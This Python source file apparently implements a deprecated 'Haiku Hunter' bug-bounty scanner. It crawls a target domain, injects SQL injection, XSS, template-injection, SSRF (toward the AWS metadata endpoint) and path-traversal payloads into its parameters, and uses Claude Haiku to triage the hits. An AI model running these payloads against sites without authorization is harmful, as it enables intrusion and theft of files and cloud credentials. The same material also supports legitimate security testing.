#!/usr/bin/env python3
"""
BEATRIX Haiku Hunter
====================
⚠️  DEPRECATED: Consolidated into beatrix.hunters.haiku module.
    Use: beatrix haiku-hunt <target>
    Or:  from beatrix.hunters.haiku import HaikuHunter

AI-assisted vulnerability hunting using Claude Haiku via AWS Bedrock

Features:
- Discovers endpoints
- Intelligent payload generation
- False-positive filtering
- Detailed analysis reports

Usage:
    export AWS_DEFAULT_REGION=us-east-1  # or your preferred region
    python haiku_hunter.py --target example.com
"""

import argparse
import asyncio
import json
import re
from typing import Dict, List

import httpx

# Check for boto3
try:
    import boto3
    from botocore.config import Config
    HAS_BOTO = True
except ImportError:
    HAS_BOTO = False
    print("[!] boto3 not installed - run: pip install boto3")


class HaikuAnalyzer:
    """Claude Haiku for security analysis"""

    def __init__(self, region: str = "us-east-1"):
        if not HAS_BOTO:
            raise RuntimeError("boto3 required")

        self.region = region
        config = Config(
            region_name=region,
            retries={'max_attempts': 3}
        )
        self.client = boto3.client('bedrock-runtime', config=config)
        self.model_id = "anthropic.claude-3-haiku-20240307-v1:0"

        # Track costs (~$0.00025 per 1K input, $0.00125 per 1K output)
        self.input_tokens = 0
        self.output_tokens = 0

    async def analyze(self, prompt: str, max_tokens: int = 1000) -> str:
        """Send prompt to Haiku"""
        body = json.dumps({
            "anthropic_version": "bedrock-2023-05-31",
            "max_tokens": max_tokens,
            "messages": [{"role": "user", "content": prompt}]
        })

        # Run in executor since boto3 is sync
        loop = asyncio.get_event_loop()
        response = await loop.run_in_executor(
            None,
            lambda: self.client.invoke_model(
                modelId=self.model_id,
                body=body
            )
        )

        result = json.loads(response['body'].read())

        # Track tokens
        self.input_tokens += result.get('usage', {}).get('input_tokens', 0)
        self.output_tokens += result.get('usage', {}).get('output_tokens', 0)

        return result['content'][0]['text']

    def get_cost(self) -> float:
        """Estimate cost in USD"""
        input_cost = (self.input_tokens / 1000) * 0.00025
        output_cost = (self.output_tokens / 1000) * 0.00125
        return input_cost + output_cost


class HaikuHunter:
    """AI-Powered Bug Bounty Hunter"""

    INJECTION_TESTS = {
        'sqli': [
            ("'", "Single quote"),
            ("''", "Double quote"),
            ("' OR '1'='1", "Boolean SQLi"),
            ("' AND '1'='2", "Boolean SQLi false"),
            ("' AND SLEEP(3)--", "Time-based SQLi"),
            ("1' UNION SELECT NULL--", "UNION SQLi"),
        ],
        'xss': [
            ("<script>alert(1)</script>", "Basic script"),
            ("<img src=x onerror=alert(1)>", "Event handler"),
            ("{{7*7}}", "Template injection"),
            ("${7*7}", "Template alt syntax"),
            ("javascript:alert(1)", "JS URI"),
        ],
        'ssrf': [
            ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
            ("http://127.0.0.1:22", "Local port scan"),
            ("http://localhost/admin", "Local admin"),
        ],
        'path': [
            ("../../../etc/passwd", "Path traversal Unix"),
            ("..\\..\\..\\windows\\win.ini", "Path traversal Windows"),
        ],
    }

    def __init__(self, use_ai: bool = True, region: str = "us-east-1"):
        self.use_ai = use_ai
        self.ai = HaikuAnalyzer(region) if use_ai and HAS_BOTO else None
        self.findings: List[Dict] = []
        self.endpoints: List[str] = []

    async def hunt(self, target: str, deep: bool = False):
        """Main hunting workflow"""
        print(f"\n{'='*60}")
        print("  BEATRIX HAIKU HUNTER")
        print(f"  Target: {target}")
        print(f"  AI: {'Enabled' if self.ai else 'Disabled'}")
        print(f"{'='*60}\n")

        # Phase 1: Discovery
        print("[*] Phase 1: Endpoint Discovery")
        await self._discover_endpoints(target)

        # Phase 2: Injection Testing
        print(f"\n[*] Phase 2: Testing {len(self.endpoints)} endpoints")
        await self._test_all_endpoints()

        # Phase 3: AI Analysis (if enabled)
        if self.ai and self.findings:
            print(f"\n[*] Phase 3: AI Analysis of {len(self.findings)} findings")
            await self._ai_analyze()

        # Results
        self._print_results()

        return self.findings

    async def _discover_endpoints(self, target: str):
        """Discover injectable endpoints"""
        if not target.startswith('http'):
            target = f"https://{target}"

        async with httpx.AsyncClient(timeout=10, follow_redirects=True) as client:
            # Try common endpoints
            common_paths = [
                "/", "/search", "/api/search", "/api/v1/search",
                "/login", "/signup", "/register",
                "/api/user", "/api/users", "/graphql",
                "/admin", "/dashboard", "/profile",
            ]

            for path in common_paths:
                url = f"{target.rstrip('/')}{path}"
                try:
                    resp = await client.get(url)
                    if resp.status_code < 400:
                        self.endpoints.append(url)
                        print(f"  [+] Found: {url} [{resp.status_code}]")
                except Exception:
                    pass

            # Crawl main page for links
            try:
                resp = await client.get(target)
                # Find links with parameters
                links = re.findall(r'href=["\']([^"\']+\?[^"\']+)["\']', resp.text)
                for link in links[:20]:  # Limit to 20
                    if link.startswith('/'):
                        link = f"{target.rstrip('/')}{link}"
                    if target.split('/')[2] in link:  # Same domain
                        if link not in self.endpoints:
                            self.endpoints.append(link)
                            print(f"  [+] Crawled: {link}")
            except Exception:
                pass

        print(f"  [=] Total endpoints: {len(self.endpoints)}")

    async def _test_all_endpoints(self):
        """Test all endpoints for injection vulnerabilities"""
        async with httpx.AsyncClient(timeout=10, follow_redirects=True, verify=False) as client:
            for endpoint in self.endpoints:
                await self._test_endpoint(client, endpoint)

    async def _test_endpoint(self, client: httpx.AsyncClient, endpoint: str):
        """Test single endpoint"""
        # Get baseline
        try:
            baseline = await client.get(endpoint)
            len(baseline.text)
        except Exception:
            return

        # Extract parameters if any
        if '?' in endpoint:
            base_url, query = endpoint.split('?', 1)
            params: Dict[str, str] = {}
            for p in query.split('&'):
                if '=' in p:
                    k, v = p.split('=', 1)
                    params[k] = v
                else:
                    params[p] = ''
        else:
            base_url = endpoint
            params = {'q': 'test', 'search': 'test', 'id': '1'}  # Test common params

        # Test each parameter
        for param, orig_value in params.items():
            for category, tests in self.INJECTION_TESTS.items():
                for payload, desc in tests:
                    await self._test_payload(
                        client, base_url, param, orig_value,
                        payload, desc, category, baseline
                    )

    async def _test_payload(self, client, base_url, param, orig_value,
                           payload, desc, category, baseline):
        """Test single payload"""
        test_value = f"{orig_value}{payload}"

        try:
            import time
            start = time.time()
            resp = await client.get(f"{base_url}?{param}={test_value}")
            elapsed = time.time() - start

            # Detection logic
            is_vuln = False
            evidence = ""

            # SQL errors
            sql_errors = ['SQL syntax', 'mysql_', 'pg_', 'ORA-', 'SQLSTATE',
                         'syntax error', 'unclosed quotation']
            for err in sql_errors:
                if err.lower() in resp.text.lower():
                    is_vuln = True
                    evidence = f"SQL error: {err}"
                    break

            # Time-based
            if category == 'sqli' and 'SLEEP' in payload and elapsed > 2.5:
                is_vuln = True
                evidence = f"Response delayed {elapsed:.2f}s"

            # XSS reflection
            if category == 'xss' and payload in resp.text:
                is_vuln = True
                evidence = "Payload reflected in response"

            # SSTI
            if '{{7*7}}' in payload and '49' in resp.text:
                # Need context check
                idx = resp.text.find('49')
                ctx = resp.text[max(0,idx-30):idx+10]
                if '{{7*7}}' not in ctx:  # Avoid false positive
                    is_vuln = True
                    evidence = "Template evaluated (49 found)"

            # LFI
            lfi_indicators = ['root:x:0', 'daemon:', 'bin/bash', '[extensions]', '[fonts]']
            for ind in lfi_indicators:
                if ind in resp.text:
                    is_vuln = True
                    evidence = f"File content: {ind}"
                    break

            # SSRF
            ssrf_indicators = ['ami-id', 'instance-id', 'security-credentials']
            for ind in ssrf_indicators:
                if ind in resp.text:
                    is_vuln = True
                    evidence = f"SSRF indicator: {ind}"
                    break

            if is_vuln:
                finding = {
                    'url': base_url,
                    'param': param,
                    'payload': payload,
                    'description': desc,
                    'category': category,
                    'evidence': evidence,
                    'status_code': resp.status_code,
                    'response_time': elapsed,
                    'ai_verified': False,
                }
                self.findings.append(finding)
                print(f"  [!] {category.upper()} @ {param}: {evidence}")

        except Exception:
            pass

    async def _ai_analyze(self):
        """Use Haiku to analyze findings"""
        if not self.ai:
            return

        for finding in self.findings:
            prompt = f"""Analyze this potential security vulnerability:

Category: {finding['category'].upper()}
URL: {finding['url']}
Parameter: {finding['param']}
Payload: {finding['payload']}
Evidence: {finding['evidence']}
Status Code: {finding['status_code']}

Questions:
1. Is this likely a TRUE POSITIVE or FALSE POSITIVE? Why?
2. What is the potential severity (Critical/High/Medium/Low)?
3. What additional tests would confirm this vulnerability?
4. If true positive, what is the attack scenario?

Be concise and direct."""

            try:
                analysis = await self.ai.analyze(prompt, max_tokens=500)
                finding['ai_analysis'] = analysis
                finding['ai_verified'] = 'TRUE POSITIVE' in analysis.upper()
                print(f"  [AI] Analyzed {finding['category']} - {'Verified' if finding['ai_verified'] else 'Needs review'}")
            except Exception as e:
                print(f"  [!] AI error: {e}")

    def _print_results(self):
        """Print final results"""
        print(f"\n{'='*60}")
        print("  HUNT RESULTS")
        print(f"{'='*60}")
        print(f"  Endpoints tested: {len(self.endpoints)}")
        print(f"  Findings: {len(self.findings)}")

        if self.ai:
            verified = sum(1 for f in self.findings if f.get('ai_verified'))
            print(f"  AI Verified: {verified}")
            print(f"  AI Cost: ${self.ai.get_cost():.4f}")

        print()

        for i, f in enumerate(self.findings, 1):
            status = "✓ VERIFIED" if f.get('ai_verified') else "? REVIEW"
            print(f"[{i}] {status} - {f['category'].upper()}")
            print(f"    URL: {f['url']}")
            print(f"    Param: {f['param']}")
            print(f"    Payload: {f['payload'][:50]}")
            print(f"    Evidence: {f['evidence']}")
            if f.get('ai_analysis'):
                # Show first few lines of AI analysis
                lines = f['ai_analysis'].split('\n')[:3]
                print(f"    AI: {' '.join(lines)[:100]}...")
            print()


async def main():
    parser = argparse.ArgumentParser(description="Haiku-powered bug bounty hunter")
    parser.add_argument("--target", "-t", required=True, help="Target domain")
    parser.add_argument("--no-ai", action="store_true", help="Disable AI analysis")
    parser.add_argument("--deep", action="store_true", help="Deep scan (more payloads)")
    parser.add_argument("--region", default="us-east-1", help="AWS region for Bedrock")

    args = parser.parse_args()

    hunter = HaikuHunter(use_ai=not args.no_ai, region=args.region)
    findings = await hunter.hunt(args.target, deep=args.deep)

    # Save results
    output_file = f"haiku_results_{args.target.replace('.', '_')}.json"
    with open(output_file, 'w') as f:
        json.dump(findings, f, indent=2, default=str)
    print(f"\n[*] Results saved to {output_file}")


if __name__ == "__main__":
    asyncio.run(main())
